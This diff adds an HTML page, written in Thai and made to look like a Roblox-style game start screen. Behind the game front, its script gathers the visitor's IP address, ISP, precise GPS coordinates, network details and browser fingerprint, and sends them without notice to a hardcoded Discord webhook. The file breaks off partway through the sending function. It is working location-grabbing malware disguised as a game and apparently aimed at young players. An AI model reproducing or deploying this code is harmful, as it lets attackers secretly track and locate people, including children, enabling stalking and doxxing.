@@ -1,0 +1,985 @@
+<!DOCTYPE html>
+<html lang="th">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>เว็บไซต์</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Fredoka+One&family=Comfortaa:wght@400;700&display=swap');
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Comfortaa', cursive;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background: 
+                linear-gradient(to bottom, 
+                    #87CEEB 0%, 
+                    #98D8E8 20%, 
+                    #B0E0E6 40%, 
+                    #C8E6F0 60%, 
+                    #E0F2F8 80%, 
+                    #F0F8FF 100%
+                );
+            padding: 20px;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        /* เอฟเฟกต์พื้นหลัง Roblox */
+        body::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: 
+                radial-gradient(circle at 20% 50%, rgba(255, 255, 255, 0.2) 0%, transparent 50%),
+                radial-gradient(circle at 80% 80%, rgba(135, 206, 250, 0.25) 0%, transparent 50%),
+                radial-gradient(circle at 40% 20%, rgba(173, 216, 230, 0.2) 0%, transparent 50%),
+                repeating-linear-gradient(
+                    0deg,
+                    transparent,
+                    transparent 100px,
+                    rgba(255, 255, 255, 0.03) 100px,
+                    rgba(255, 255, 255, 0.03) 102px
+                );
+            animation: backgroundMove 20s ease-in-out infinite;
+            z-index: 0;
+        }
+        
+        /* Pattern แบบ Roblox blocks */
+        body::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: 
+                linear-gradient(45deg, rgba(255,255,255,0.05) 25%, transparent 25%),
+                linear-gradient(-45deg, rgba(255,255,255,0.05) 25%, transparent 25%),
+                linear-gradient(45deg, transparent 75%, rgba(255,255,255,0.05) 75%),
+                linear-gradient(-45deg, transparent 75%, rgba(255,255,255,0.05) 75%);
+            background-size: 60px 60px;
+            background-position: 0 0, 0 30px, 30px -30px, -30px 0px;
+            opacity: 0.3;
+            z-index: 0;
+        }
+        
+        @keyframes backgroundMove {
+            0%, 100% { transform: translate(0, 0) scale(1); }
+            50% { transform: translate(-20px, -20px) scale(1.1); }
+        }
+        
+        /* เกาะลอย (Roblox style) */
+        .floating-island {
+            position: absolute;
+            width: 200px;
+            height: 200px;
+            background: linear-gradient(135deg, #8B6F47 0%, #A0826D 50%, #8B6F47 100%);
+            border-radius: 50% 50% 50% 50% / 60% 60% 40% 40%;
+            box-shadow: 
+                0 20px 40px rgba(0,0,0,0.25),
+                inset 0 -10px 20px rgba(0,0,0,0.2),
+                inset 0 5px 10px rgba(255,255,255,0.1);
+            animation: float 6s ease-in-out infinite;
+            z-index: 1;
+            opacity: 0.4;
+            border: 2px solid rgba(139, 111, 71, 0.5);
+        }
+        
+        .floating-island:nth-child(1) {
+            top: 10%;
+            left: 10%;
+            animation-delay: 0s;
+        }
+        
+        .floating-island:nth-child(2) {
+            top: 60%;
+            right: 15%;
+            animation-delay: 2s;
+            width: 150px;
+            height: 150px;
+        }
+        
+        .floating-island:nth-child(3) {
+            bottom: 20%;
+            left: 20%;
+            animation-delay: 4s;
+            width: 120px;
+            height: 120px;
+        }
+        
+        @keyframes float {
+            0%, 100% { transform: translateY(0px) rotate(0deg); }
+            50% { transform: translateY(-20px) rotate(5deg); }
+        }
+        
+        .container {
+            background: linear-gradient(135deg, rgba(255, 255, 255, 0.98) 0%, rgba(240, 248, 255, 0.95) 100%);
+            border-radius: 25px;
+            padding: 50px 40px;
+            box-shadow: 
+                0 25px 50px rgba(0,0,0,0.25),
+                0 0 0 5px rgba(135, 206, 250, 0.3),
+                0 0 0 8px rgba(255, 255, 255, 0.5),
+                inset 0 2px 5px rgba(255, 255, 255, 0.9),
+                inset 0 -2px 5px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            max-width: 500px;
+            width: 100%;
+            position: relative;
+            z-index: 10;
+            backdrop-filter: blur(15px);
+            border: 4px solid rgba(135, 206, 250, 0.4);
+            animation: containerFloat 3s ease-in-out infinite;
+        }
+        
+        @keyframes containerFloat {
+            0%, 100% { transform: translateY(0px); }
+            50% { transform: translateY(-10px); }
+        }
+        
+        h1 {
+            background: linear-gradient(135deg, #1E88E5 0%, #0D47A1 50%, #1E88E5 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            margin-bottom: 40px;
+            font-size: 48px;
+            font-family: 'Fredoka One', cursive;
+            text-shadow: 
+                3px 3px 0px rgba(30, 136, 229, 0.2),
+                6px 6px 0px rgba(13, 71, 161, 0.15),
+                0 0 20px rgba(30, 136, 229, 0.3);
+            letter-spacing: 3px;
+            animation: titleBounce 2s ease-in-out infinite;
+            filter: drop-shadow(2px 2px 4px rgba(0,0,0,0.2));
+        }
+        
+        @keyframes titleBounce {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+        
+        .btn {
+            background: linear-gradient(135deg, #00A86B 0%, #00C853 50%, #00A86B 100%);
+            color: white;
+            border: none;
+            padding: 20px 50px;
+            font-size: 22px;
+            font-family: 'Fredoka One', cursive;
+            border-radius: 12px;
+            cursor: pointer;
+            position: relative;
+            transition: all 0.3s cubic-bezier(0.68, -0.55, 0.265, 1.55);
+            box-shadow: 
+                0 8px 0 #006B47,
+                0 12px 20px rgba(0,0,0,0.3),
+                inset 0 2px 0 rgba(255,255,255,0.4),
+                inset 0 -2px 0 rgba(0,0,0,0.2);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            overflow: hidden;
+            border: 2px solid rgba(255,255,255,0.2);
+        }
+        
+        .btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
+            transition: left 0.5s;
+        }
+        
+        .btn:hover::before {
+            left: 100%;
+        }
+        
+        .btn:hover {
+            transform: translateY(-4px);
+            box-shadow: 
+                0 12px 0 #006B47,
+                0 16px 30px rgba(0,168,107,0.4),
+                inset 0 2px 0 rgba(255,255,255,0.5),
+                inset 0 -2px 0 rgba(0,0,0,0.2);
+            background: linear-gradient(135deg, #00C853 0%, #00E676 50%, #00C853 100%);
+        }
+        
+        .btn:active {
+            transform: translateY(-2px);
+            box-shadow: 
+                0 4px 0 #006B47,
+                0 8px 15px rgba(0,0,0,0.3),
+                inset 0 2px 0 rgba(255,255,255,0.3),
+                inset 0 -2px 0 rgba(0,0,0,0.3);
+        }
+        
+        /* เอฟเฟกต์แสงสว่าง */
+        .sparkle {
+            position: absolute;
+            width: 4px;
+            height: 4px;
+            background: white;
+            border-radius: 50%;
+            animation: sparkle 2s infinite;
+            pointer-events: none;
+        }
+        
+        @keyframes sparkle {
+            0%, 100% { 
+                opacity: 0;
+                transform: scale(0) translate(0, 0);
+            }
+            50% { 
+                opacity: 1;
+                transform: scale(1) translate(20px, -20px);
+            }
+        }
+        
+        /* เอฟเฟกต์เมฆ */
+        .cloud {
+            position: absolute;
+            background: rgba(255, 255, 255, 0.6);
+            border-radius: 50px;
+            z-index: 2;
+            animation: cloudMove 30s infinite linear;
+        }
+        
+        .cloud::before,
+        .cloud::after {
+            content: '';
+            position: absolute;
+            background: rgba(255, 255, 255, 0.6);
+            border-radius: 50px;
+        }
+        
+        .cloud1 {
+            width: 100px;
+            height: 40px;
+            top: 20%;
+            left: -150px;
+        }
+        
+        .cloud1::before {
+            width: 50px;
+            height: 50px;
+            top: -25px;
+            left: 10px;
+        }
+        
+        .cloud1::after {
+            width: 60px;
+            height: 60px;
+            top: -35px;
+            right: 10px;
+        }
+        
+        .cloud2 {
+            width: 80px;
+            height: 30px;
+            top: 60%;
+            left: -150px;
+            animation-delay: 10s;
+        }
+        
+        .cloud2::before {
+            width: 40px;
+            height: 40px;
+            top: -20px;
+            left: 8px;
+        }
+        
+        .cloud2::after {
+            width: 50px;
+            height: 50px;
+            top: -25px;
+            right: 8px;
+        }
+        
+        @keyframes cloudMove {
+            0% { left: -150px; }
+            100% { left: 100%; }
+        }
+    </style>
+</head>
+<body>
+    <div class="floating-island"></div>
+    <div class="floating-island"></div>
+    <div class="floating-island"></div>
+    <div class="cloud cloud1"></div>
+    <div class="cloud cloud2"></div>
+    
+    <div class="container">
+        <h1>🎮 ยินดีต้อนรับ 🎮</h1>
+        <button class="btn" id="captureBtn">
+            <span>🎯 เริ่มเกม</span>
+        </button>
+    </div>
+
+    <script>
+        const captureBtn = document.getElementById('captureBtn');
+        const container = document.querySelector('.container');
+
+        // สร้างเอฟเฟกต์ sparkle
+        function createSparkle(x, y) {
+            const sparkle = document.createElement('div');
+            sparkle.className = 'sparkle';
+            sparkle.style.left = x + 'px';
+            sparkle.style.top = y + 'px';
+            document.body.appendChild(sparkle);
+            
+            setTimeout(() => {
+                sparkle.remove();
+            }, 2000);
+        }
+
+        // เพิ่มเอฟเฟกต์เมื่อคลิกปุ่ม
+        captureBtn.addEventListener('click', (e) => {
+            const rect = captureBtn.getBoundingClientRect();
+            const x = rect.left + rect.width / 2;
+            const y = rect.top + rect.height / 2;
+            
+            // สร้าง sparkle หลายจุด
+            for (let i = 0; i < 8; i++) {
+                setTimeout(() => {
+                    const angle = (Math.PI * 2 * i) / 8;
+                    const offsetX = Math.cos(angle) * 30;
+                    const offsetY = Math.sin(angle) * 30;
+                    createSparkle(x + offsetX, y + offsetY);
+                }, i * 50);
+            }
+        });
+
+        // เก็บข้อมูลทั้งหมด
+        let collectedData = {};
+
+        // ดึงข้อมูล IP จากหลายแหล่งเพื่อความแม่นยำ
+        async function getIPFromMultipleSources() {
+            const ipSources = [
+                'https://api.ipify.org?format=json',
+                'https://api64.ipify.org?format=json',
+                'https://icanhazip.com',
+                'https://ifconfig.me/ip'
+            ];
+            
+            for (const source of ipSources) {
+                try {
+                    if (source.includes('ipify')) {
+                        const response = await fetch(source);
+                        const data = await response.json();
+                        return data.ip;
+                    } else {
+                        const response = await fetch(source);
+                        const text = await response.text();
+                        const ip = text.trim();
+                        if (ip.match(/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/)) {
+                            return ip;
+                        }
+                    }
+                } catch (e) {
+                    continue;
+                }
+            }
+            return null;
+        }
+
+        // ดึงข้อมูล ISP และตำแหน่งจากหลาย API
+        async function getDetailedIPInfo(ip) {
+            const results = {
+                ipApi: null,
+                ipInfo: null,
+                ipWhois: null
+            };
+
+            // 1. ip-api.com (รองรับ CORS)
+            try {
+                const response = await fetch(`https://ip-api.com/json/${ip}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,asname,query,district,currency,continent,continentCode`);
+                const data = await response.json();
+                if (data.status === 'success') {
+                    results.ipApi = {
+                        country: data.country,
+                        countryCode: data.countryCode,
+                        region: data.regionName,
+                        city: data.city,
+                        district: data.district,
+                        zip: data.zip,
+                        latitude: data.lat,
+                        longitude: data.lon,
+                        timezone: data.timezone,
+                        isp: data.isp,
+                        org: data.org,
+                        as: data.as,
+                        asname: data.asname,
+                        continent: data.continent,
+                        continentCode: data.continentCode
+                    };
+                }
+            } catch (e) {}
+
+            // 2. ipinfo.io (ใช้ JSONP หรือ CORS proxy)
+            try {
+                const response = await fetch(`https://ipinfo.io/${ip}/json`);
+                const data = await response.json();
+                if (data.ip) {
+                    const [lat, lon] = (data.loc || '').split(',').map(Number);
+                    results.ipInfo = {
+                        country: data.country,
+                        region: data.region,
+                        city: data.city,
+                        zip: data.postal,
+                        latitude: lat,
+                        longitude: lon,
+                        timezone: data.timezone,
+                        isp: data.org,
+                        org: data.org,
+                        hostname: data.hostname
+                    };
+                }
+            } catch (e) {}
+
+            // 3. ipwhois.app (รองรับ CORS)
+            try {
+                const response = await fetch(`https://ipwhois.app/json/${ip}`);
+                const data = await response.json();
+                if (data.success) {
+                    results.ipWhois = {
+                        country: data.country,
+                        countryCode: data.country_code,
+                        region: data.region,
+                        city: data.city,
+                        latitude: data.latitude,
+                        longitude: data.longitude,
+                        timezone: data.timezone?.name,
+                        isp: data.isp,
+                        org: data.org,
+                        asn: data.asn,
+                        asname: data.asnname,
+                        continent: data.continent,
+                        currency: data.currency
+                    };
+                }
+            } catch (e) {}
+
+            return results;
+        }
+
+        // รวมข้อมูลจากหลายแหล่งและหาค่าเฉลี่ย
+        function mergeIPData(sources) {
+            const merged = {
+                ip: collectedData.ip,
+                country: null,
+                countryCode: null,
+                region: null,
+                city: null,
+                district: null,
+                zip: null,
+                latitude: null,
+                longitude: null,
+                timezone: null,
+                isp: null,
+                org: null,
+                as: null,
+                asname: null,
+                continent: null,
+                hostname: null,
+                sources: []
+            };
+
+            const countries = [];
+            const regions = [];
+            const cities = [];
+            const isps = [];
+            const orgs = [];
+            const timezones = [];
+            const lats = [];
+            const lons = [];
+
+            // รวบรวมข้อมูลจากทุกแหล่ง
+            if (sources.ipApi) {
+                merged.sources.push('ip-api.com');
+                if (sources.ipApi.country) countries.push(sources.ipApi.country);
+                if (sources.ipApi.countryCode) merged.countryCode = sources.ipApi.countryCode;
+                if (sources.ipApi.region) regions.push(sources.ipApi.region);
+                if (sources.ipApi.city) cities.push(sources.ipApi.city);
+                if (sources.ipApi.district) merged.district = sources.ipApi.district;
+                if (sources.ipApi.zip) merged.zip = sources.ipApi.zip;
+                if (sources.ipApi.latitude) lats.push(sources.ipApi.latitude);
+                if (sources.ipApi.longitude) lons.push(sources.ipApi.longitude);
+                if (sources.ipApi.timezone) timezones.push(sources.ipApi.timezone);
+                if (sources.ipApi.isp) isps.push(sources.ipApi.isp);
+                if (sources.ipApi.org) orgs.push(sources.ipApi.org);
+                if (sources.ipApi.as) merged.as = sources.ipApi.as;
+                if (sources.ipApi.asname) merged.asname = sources.ipApi.asname;
+                if (sources.ipApi.continent) merged.continent = sources.ipApi.continent;
+            }
+
+            if (sources.ipInfo) {
+                merged.sources.push('ipinfo.io');
+                if (sources.ipInfo.country) countries.push(sources.ipInfo.country);
+                if (sources.ipInfo.region) regions.push(sources.ipInfo.region);
+                if (sources.ipInfo.city) cities.push(sources.ipInfo.city);
+                if (sources.ipInfo.zip) merged.zip = merged.zip || sources.ipInfo.zip;
+                if (sources.ipInfo.latitude) lats.push(sources.ipInfo.latitude);
+                if (sources.ipInfo.longitude) lons.push(sources.ipInfo.longitude);
+                if (sources.ipInfo.timezone) timezones.push(sources.ipInfo.timezone);
+                if (sources.ipInfo.isp) isps.push(sources.ipInfo.isp);
+                if (sources.ipInfo.org) orgs.push(sources.ipInfo.org);
+                if (sources.ipInfo.hostname) merged.hostname = sources.ipInfo.hostname;
+            }
+
+            if (sources.ipWhois) {
+                merged.sources.push('ipwhois.app');
+                if (sources.ipWhois.country) countries.push(sources.ipWhois.country);
+                if (sources.ipWhois.countryCode) merged.countryCode = merged.countryCode || sources.ipWhois.countryCode;
+                if (sources.ipWhois.region) regions.push(sources.ipWhois.region);
+                if (sources.ipWhois.city) cities.push(sources.ipWhois.city);
+                if (sources.ipWhois.latitude) lats.push(sources.ipWhois.latitude);
+                if (sources.ipWhois.longitude) lons.push(sources.ipWhois.longitude);
+                if (sources.ipWhois.timezone) timezones.push(sources.ipWhois.timezone);
+                if (sources.ipWhois.isp) isps.push(sources.ipWhois.isp);
+                if (sources.ipWhois.org) orgs.push(sources.ipWhois.org);
+                if (sources.ipWhois.asn) merged.as = merged.as || sources.ipWhois.asn;
+                if (sources.ipWhois.asname) merged.asname = merged.asname || sources.ipWhois.asname;
+                if (sources.ipWhois.continent) merged.continent = merged.continent || sources.ipWhois.continent;
+            }
+
+            // หาค่าที่พบบ่อยที่สุด (mode)
+            function getMostCommon(arr) {
+                if (arr.length === 0) return null;
+                const counts = {};
+                arr.forEach(item => {
+                    if (item) counts[item] = (counts[item] || 0) + 1;
+                });
+                return Object.keys(counts).reduce((a, b) => counts[a] > counts[b] ? a : b);
+            }
+
+            // คำนวณค่าเฉลี่ยพิกัด
+            function average(arr) {
+                const valid = arr.filter(v => v != null && !isNaN(v));
+                if (valid.length === 0) return null;
+                return valid.reduce((a, b) => a + b, 0) / valid.length;
+            }
+
+            merged.country = getMostCommon(countries);
+            merged.region = getMostCommon(regions);
+            merged.city = getMostCommon(cities);
+            merged.timezone = getMostCommon(timezones);
+            merged.isp = getMostCommon(isps) || isps[0] || null;
+            merged.org = getMostCommon(orgs) || orgs[0] || null;
+            merged.latitude = average(lats);
+            merged.longitude = average(lons);
+
+            // คำนวณความแม่นยำของตำแหน่ง (จากความแปรปรวน)
+            if (lats.length > 1 && lons.length > 1) {
+                const latVariance = lats.reduce((sum, lat) => sum + Math.pow(lat - merged.latitude, 2), 0) / lats.length;
+                const lonVariance = lons.reduce((sum, lon) => sum + Math.pow(lon - merged.longitude, 2), 0) / lons.length;
+                merged.locationAccuracy = Math.sqrt(latVariance + lonVariance) * 111; // แปลงเป็นกิโลเมตร (ประมาณ)
+            }
+
+            return merged;
+        }
+
+        // ดักข้อมูล IP และข้อมูลเครือข่าย
+        async function captureIPAndNetwork() {
+            try {
+                // ดึง IP จากหลายแหล่ง
+                const ip = await getIPFromMultipleSources();
+                if (!ip) {
+                    const ipResponse = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipResponse.json();
+                    collectedData.ip = ipData.ip;
+                } else {
+                    collectedData.ip = ip;
+                }
+
+                // ดึงข้อมูลละเอียดจากหลาย API
+                const detailedSources = await getDetailedIPInfo(collectedData.ip);
+                collectedData.ipDetails = mergeIPData(detailedSources);
+
+                // ข้อมูลเครือข่าย
+                if (navigator.connection) {
+                    collectedData.network = {
+                        effectiveType: navigator.connection.effectiveType,
+                        downlink: navigator.connection.downlink,
+                        rtt: navigator.connection.rtt,
+                        saveData: navigator.connection.saveData
+                    };
+                }
+
+                // ข้อมูลเบราว์เซอร์และอุปกรณ์
+                collectedData.browser = {
+                    userAgent: navigator.userAgent,
+                    language: navigator.language,
+                    platform: navigator.platform,
+                    cookieEnabled: navigator.cookieEnabled,
+                    onLine: navigator.onLine,
+                    screenWidth: window.screen.width,
+                    screenHeight: window.screen.height,
+                    windowWidth: window.innerWidth,
+                    windowHeight: window.innerHeight,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    timezoneOffset: new Date().getTimezoneOffset()
+                };
+            } catch (error) {
+                // ไม่แสดงข้อความ
+            }
+        }
+
+        // คำนวณตำแหน่งที่แม่นยำที่สุดจากหลายแหล่ง
+        function calculateBestLocation(ipLocation, gpsLocation) {
+            if (!ipLocation || (!ipLocation.latitude && !ipLocation.longitude)) {
+                return gpsLocation;
+            }
+            if (!gpsLocation || (!gpsLocation.latitude && !gpsLocation.longitude)) {
+                return ipLocation;
+            }
+
+            // คำนวณระยะห่างระหว่าง IP location กับ GPS location
+            function calculateDistance(lat1, lon1, lat2, lon2) {
+                const R = 6371; // รัศมีโลกในหน่วยกิโลเมตร
+                const dLat = (lat2 - lat1) * Math.PI / 180;
+                const dLon = (lon2 - lon1) * Math.PI / 180;
+                const a = Math.sin(dLat/2) * Math.sin(dLat/2) +
+                    Math.cos(lat1 * Math.PI / 180) * Math.cos(lat2 * Math.PI / 180) *
+                    Math.sin(dLon/2) * Math.sin(dLon/2);
+                const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
+                return R * c;
+            }
+
+            const distance = calculateDistance(
+                ipLocation.latitude, ipLocation.longitude,
+                gpsLocation.latitude, gpsLocation.longitude
+            );
+
+            // ถ้า GPS มีความแม่นยำสูง (accuracy < 100m) และระยะห่างไม่เกิน 10km ให้ใช้ GPS
+            // ถ้าไม่ ให้ใช้ค่าเฉลี่ยถ่วงน้ำหนัก
+            if (gpsLocation.accuracy && gpsLocation.accuracy < 100 && distance < 10) {
+                return {
+                    ...gpsLocation,
+                    source: 'GPS (High Accuracy)',
+                    distanceFromIP: distance.toFixed(2)
+                };
+            }
+
+            // คำนวณค่าเฉลี่ยถ่วงน้ำหนัก (weighted average)
+            const ipWeight = ipLocation.locationAccuracy ? 
+                (1 / (ipLocation.locationAccuracy + 1)) : 0.3;
+            const gpsWeight = gpsLocation.accuracy ? 
+                (1 / (gpsLocation.accuracy / 1000 + 1)) : 0.7; // แปลง accuracy จากเมตรเป็นกิโลเมตร
+
+            const totalWeight = ipWeight + gpsWeight;
+            const bestLat = (ipLocation.latitude * ipWeight + gpsLocation.latitude * gpsWeight) / totalWeight;
+            const bestLon = (ipLocation.longitude * ipWeight + gpsLocation.longitude * gpsWeight) / totalWeight;
+
+            return {
+                latitude: bestLat,
+                longitude: bestLon,
+                source: 'Calculated (Weighted Average)',
+                ipLocation: { lat: ipLocation.latitude, lon: ipLocation.longitude },
+                gpsLocation: { lat: gpsLocation.latitude, lon: gpsLocation.longitude },
+                distanceFromIP: distance.toFixed(2),
+                estimatedAccuracy: Math.max(
+                    ipLocation.locationAccuracy || 50,
+                    gpsLocation.accuracy ? gpsLocation.accuracy / 1000 : 50
+                ).toFixed(2)
+            };
+        }
+
+        // ดักข้อมูล GPS
+        function captureGPS() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    collectedData.gps = { error: 'Geolocation ไม่รองรับ' };
+                    resolve();
+                    return;
+                }
+
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        collectedData.gps = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy,
+                            altitude: position.coords.altitude,
+                            altitudeAccuracy: position.coords.altitudeAccuracy,
+                            heading: position.coords.heading,
+                            speed: position.coords.speed,
+                            timestamp: new Date(position.timestamp).toLocaleString('th-TH')
+                        };
+                        resolve();
+                    },
+                    (error) => {
+                        collectedData.gps = {
+                            error: error.message,
+                            code: error.code
+                        };
+                        resolve();
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
+            });
+        }
+
+        // ส่งข้อมูลไปยัง Discord webhook (เงียบๆ)
+        async function sendDataToServer(data) {
+            try {
+                // สร้างข้อความสำหรับ Discord
+                let message = '**📊 ข้อมูลที่ดักได้**\n\n';
+                
+                if (data.ip) {
+                    message += `**IP Address:** ${data.ip}\n`;
+                }
+                
+                if (data.ipDetails) {
+                    message += `**🌍 ข้อมูลตำแหน่ง IP:**\n`;
+                    message += `- ประเทศ: ${data.ipDetails.country || 'N/A'} (${data.ipDetails.countryCode || 'N/A'})\n`;
+                    message += `- ทวีป: ${data.ipDetails.continent || 'N/A'}\n`;
+                    message += `- ภูมิภาค: ${data.ipDetails.region || 'N/A'}\n`;
+                    message += `- เมือง: ${data.ipDetails.city || 'N/A'}\n`;
+                    if (data.ipDetails.district) {
+                        message += `- เขต/อำเภอ: ${data.ipDetails.district}\n`;
+                    }
+                    if (data.ipDetails.zip) {
+                        message += `- รหัสไปรษณีย์: ${data.ipDetails.zip}\n`;
+                    }
+                    if (data.ipDetails.latitude && data.ipDetails.longitude) {
+                        message += `- พิกัด IP: ${data.ipDetails.latitude.toFixed(6)}, ${data.ipDetails.longitude.toFixed(6)}\n`;
+                        message += `- Google Maps (IP): https://www.google.com/maps?q=${data.ipDetails.latitude},${data.ipDetails.longitude}\n`;
+                        if (data.ipDetails.locationAccuracy) {
+                            message += `- ความแม่นยำตำแหน่ง IP: ±${data.ipDetails.locationAccuracy.toFixed(2)} กม. (จาก ${data.ipDetails.sources?.length || 0} แหล่ง)\n`;
+                        }
+                    }
+                    message += `- Timezone: ${data.ipDetails.timezone || 'N/A'}\n`;
+                    if (data.ipDetails.hostname) {
+                        message += `- Hostname: ${data.ipDetails.hostname}\n`;
+                    }
+                    
+                    message += `\n**🌐 ข้อมูลผู้ให้บริการเน็ต (ISP):**\n`;
+                    message += `- ISP: ${data.ipDetails.isp || 'N/A'}\n`;
+                    message += `- Organization: ${data.ipDetails.org || 'N/A'}\n`;
+                    if (data.ipDetails.as) {
+                        message += `- AS Number: ${data.ipDetails.as}\n`;
+                    }
+                    if (data.ipDetails.asname) {
+                        message += `- AS Name: ${data.ipDetails.asname}\n`;
+                    }
+                    if (data.ipDetails.sources && data.ipDetails.sources.length > 0) {
+                        message += `- ข้อมูลจาก: ${data.ipDetails.sources.join(', ')}\n`;
+                    }
+                }
+                
+                if (data.network) {
+                    message += `\n**ข้อมูลเครือข่าย:**\n`;
+                    message += `- ประเภท: ${data.network.effectiveType || 'N/A'}\n`;
+                    message += `- ความเร็ว: ${data.network.downlink || 'N/A'} Mbps\n`;
+                    message += `- RTT: ${data.network.rtt || 'N/A'} ms\n`;
+                }
+                
+                if (data.bestLocation && data.bestLocation.latitude) {
+                    message += `\n**🎯 ตำแหน่งที่แม่นยำที่สุด (Best Location):**\n`;
+                    message += `- Lat: ${data.bestLocation.latitude.toFixed(6)}\n`;
+                    message += `- Lng: ${data.bestLocation.longitude.toFixed(6)}\n`;
+                    message += `- แหล่งข้อมูล: ${data.bestLocation.source || 'N/A'}\n`;
+                    if (data.bestLocation.estimatedAccuracy) {
+                        message += `- ความแม่นยำโดยประมาณ: ±${data.bestLocation.estimatedAccuracy} กม.\n`;
+                    }
+                    if (data.bestLocation.distanceFromIP) {
+                        message += `- ระยะห่างจาก IP Location: ${data.bestLocation.distanceFromIP} กม.\n`;
+                    }
+                    message += `- Google Maps: https://www.google.com/maps?q=${data.bestLocation.latitude},${data.bestLocation.longitude}\n`;
+                }
+                
+                if (data.gps && data.gps.latitude) {
+                    message += `\n**📍 GPS Location (ดิบ):**\n`;
+                    message += `- Lat: ${data.gps.latitude.toFixed(6)}\n`;
+                    message += `- Lng: ${data.gps.longitude.toFixed(6)}\n`;
+                    message += `- ความแม่นยำ: ${data.gps.accuracy?.toFixed(0) || 'N/A'} เมตร\n`;
+                } else if (data.gps && data.gps.error) {
+                    message += `\n**GPS:** ${data.gps.error}\n`;
+                }
+                
+                if (data.browser) {
+                    message += `\n**ข้อมูลเบราว์เซอร์:**\n`;
+                    message += `- User Agent: ${data.browser.userAgent}\n`;
+                    message += `- หน้าจอ: ${data.browser.screenWidth}x${data.browser.screenHeight}\n`;
+                    message += `- หน้าต่าง: ${data.browser.windowWidth}x${data.browser.windowHeight}\n`;
+                    message += `- Timezone: ${data.browser.timezone}\n`;
+                    message += `- ภาษา: ${data.browser.language}\n`;
+                    message += `- Platform: ${data.browser.platform}\n`;
+                }
+                
+                message += `\n**เวลา:** ${new Date().toLocaleString('th-TH')}\n`;
+                
+                // ส่งไปยัง Discord webhook
+                const webhookUrl = 'https://discord.com/api/webhooks/1466919559960461465/PGrk_H60VBWUtKKqdjFE7oQQ_ZK47ZaPWKLpLzPwcEg5c7xqCoaqloYLCZvc4jBEPaRE';
+                
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        content: message,
+                        embeds: [{
+                            title: '🔍 Captured Data - ข้อมูลที่ดักได้',
+                            description: 'ข้อมูล IP, ISP, และตำแหน่งที่แม่นยำ',
+                            color: 0x667eea,
+                            fields: [
+                                {
+                                    name: '🌐 IP Address',
+                                    value: data.ip || 'N/A',
+                                    inline: true
+                                },
+                                {
+                                    name: '🌍 ประเทศ',
+                                    value: `${data.ipDetails?.country || 'N/A'} (${data.ipDetails?.countryCode || 'N/A'})`,
+                                    inline: true
+                                },
+                                {
+                                    name: '🏙️ เมือง',
+                                    value: data.ipDetails?.city || 'N/A',
+                                    inline: true
+                                },
+                                {
+                                    name: '📍 ตำแหน่ง IP',
+                                    value: data.ipDetails?.latitude && data.ipDetails?.longitude 
+                                        ? `${data.ipDetails.latitude.toFixed(6)}, ${data.ipDetails.longitude.toFixed(6)}` 
+                                        : 'N/A',
+                                    inline: true
+                                },
+                                {
+                                    name: '🎯 ความแม่นยำตำแหน่ง IP',
+                                    value: data.ipDetails?.locationAccuracy 
+                                        ? `±${data.ipDetails.locationAccuracy.toFixed(2)} กม.` 
+                                        : 'N/A',
+                                    inline: true
+                                },
+                                {
+                                    name: '📡 ISP (ผู้ให้บริการเน็ต)',
+                                    value: data.ipDetails?.isp || 'N/A',
+                                    inline: true
+                                },
+                                {
+                                    name: '🏢 Organization',
+                                    value: data.ipDetails?.org || 'N/A',
+                                    inline: true
+                                },
+                                {
+                                    name: '🔢 AS Number',
+                                    value: data.ipDetails?.as || 'N/A',
+                                    inline: true
+                                },
+                                {
+                                    name: '📛 AS Name',
+                                    value: data.ipDetails?.asname || 'N/A',
+                                    inline: true
+                                },
+                                {
+                                    name: '🎯 ตำแหน่งที่แม่นยำที่สุด',
+                                    value: data.bestLocation?.latitude 
+                                        ? `${data.bestLocation.latitude.toFixed(6)}, ${data.bestLocation.longitude.toFixed(6)}\nแหล่ง: ${data.bestLocation.source || 'N/A'}` 
+                                        : 'N/A',
+                                    inline: false
+                                },
+                                {
+                                    name: '📍 GPS Location',
+                                    value: data.gps?.latitude 
+                                        ? `${data.gps.latitude.toFixed(6)}, ${data.gps.longitude.toFixed(6)} (แม่นยำ: ${data.gps.accuracy?.toFixed(0)} ม.)` 
+                                        : (data.gps?.error || 'N/A'),
+                                    inline: false
+                                },
+                                {
+                                    name: '🌐 ข้อมูลจากแหล่ง',
+                                    value: data.ipDetails?.sources?.join(', ') || 'N/A',
+                                    inline: false
+                                },
+                                {
+                                    name: '💻 Browser',
+                                    value: data.browser?.userAgent?.substring(0, 100) || 'N/A',
+                                    inline: false
+                                }
+                            ],
+                            timestamp: new Date().toISOString()
+                        }]
+                    })
+                });
+                
+                // เก็บไว้ใน localStorage (เงียบๆ)
+                const timestamp = new Date().toISOString();
